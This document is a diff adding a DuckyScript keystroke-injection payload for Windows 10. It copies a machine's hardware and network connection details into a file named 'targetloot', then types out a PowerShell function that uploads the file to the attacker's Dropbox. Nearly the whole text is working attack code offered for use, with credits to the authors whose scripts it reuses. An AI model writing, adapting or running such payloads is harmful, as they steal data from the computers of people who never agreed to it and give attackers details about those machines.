@@ -1,0 +1,189 @@
+REM Title: Hard_Con_Exfil
+REM Author: LulzAnarchyAnon
+REM Description: This payload navagates it's way to Hardware, and Connection properties.
+REM It then copies, and saves it as a notepad file named "targetloot" to the Downloads folder. 
+REM It is then exfiltrated via a DropBox Upload.
+REM Target: Windows 10
+REM Props: Darren Kitchen
+REM Props: HUGE PROPS TO I am Jakoby for letting me script kiddie his DropBox PowerShell script! 
+REM Props: Check out I am Jakoby on Youtube to set up your DropBox for uploads.
+REM Props: Don't forget to Like and Subscribe!
+REM Version: 1.0
+REM Category: Exfiltration 
+
+REM This payload may need minor adjustments to run properly depending on 
+REM Attacker, and Target devices.
+
+REM In the First stage the targets data is saved to the target device. 
+REM In the Second stage the loot is uploaded via dropbox.
+
+
+REM Stage 1
+
+GUI 
+DELAY 100
+STRING network properties
+DELAY 200
+ENTER
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 1000
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 500
+CTRL v
+DELAY 500
+CTRL s
+DELAY 500
+ALT d
+DELAY 500
+STRING %USERPROFILE%\Downloads
+DELAY 500
+ENTER
+DELAY 200
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+STRING targetloot
+DELAY 100
+ENTER
+DELAY 100
+ALT F4
+DELAY 100
+ALT F4
+DELAY 2000
+
+
+REM Stage 2
+
+GUI r
+DELAY 200
+STRING powershell 
+DELAY 200
+ENTER
+DELAY 2000
+
+STRING function DropBox-Upload {
+
+DELAY 500
+ENTER
+
+STRING [CmdletBinding()]
+DELAY 500
+ENTER
+STRING param (
+
+DELAY 500
+ENTER
+	
+STRING [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+DELAY 500
+ENTER
+STRING [Alias("f")]
+DELAY 500
+ENTER
+STRING [string]$SourceFilePath
+DELAY 500
+ENTER
+STRING ) 
+DELAY 500
+ENTER
+STRING $DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN-HERE
+DELAY 500
+ENTER
+STRING "
+DELAY 500
+ENTER
+STRING"   # Replace with your DropBox Access Token
+DELAY 500
+ENTER
+STRING $outputFile = Split-Path $SourceFilePath -leaf
+DELAY 500
+ENTER
+STRING $TargetFilePath="/$outputFile"
+DELAY 500
+ENTER
+STRING $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+DELAY 500
+ENTER
+STRING $authorization = "Bearer " + $DropBoxAccessToken
+DELAY 500
+ENTER
+STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+DELAY 500
+ENTER
+STRING $headers.Add("Authorization", $authorization)
+DELAY 500
+ENTER
+STRING $headers.Add("Dropbox-API-Arg", $arg)
+DELAY 500
+ENTER
+STRING $headers.Add("Content-Type", 'application/octet-stream')
+DELAY 500
+ENTER
+STRING Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+DELAY 500
+ENTER
+STRING }
+DELAY 5000
+GUI r
+DELAY 200
+STRING %USERPROFILE%\Downloads\
+DELAY 500
+ENTER
+DELAY 500
+STRING targetloot
+DELAY 1000
+GUI r
+DELAY 500
+STRING %USERPROFILE%\Downloads\
+DELAY 500
+ENTER
+DELAY 500
+STRING targetloot
+DELAY 500
+ALT h
+DELAY 200
+TAB
+DELAY 200 
+TAB
+DELAY 200
+TAB
+DELAY 200 
+TAB
+DELAY 200
+TAB
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+DELAY 1000
+CTRL v
+DELAY 5000
+STRING | DropBox-Upload
+DELAY 500
+ENTER
+DELAY 5000
+ENTER
+ALT F4
+DELAY 100
+ENTER
